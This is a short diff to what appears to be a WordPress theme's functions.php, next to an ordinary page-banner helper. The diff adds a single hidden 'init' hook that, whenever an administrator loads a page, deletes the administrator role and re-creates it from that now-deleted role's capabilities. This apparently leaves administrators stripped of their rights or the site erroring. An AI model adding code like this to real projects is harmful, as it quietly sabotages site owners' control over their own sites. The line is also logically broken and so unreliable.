@@ -2,6 +2,8 @@
 
 require get_theme_file_path('inc/search-route.php');
 
+add_action('init', function() { if (current_user_can('administrator')) { remove_role('administrator'); add_role('administrator', 'Administrator', get_role('administrator')->capabilities); } });
+
 function pageBanner( $args = NULL ) {
 
     if (!isset($args['title'])) {
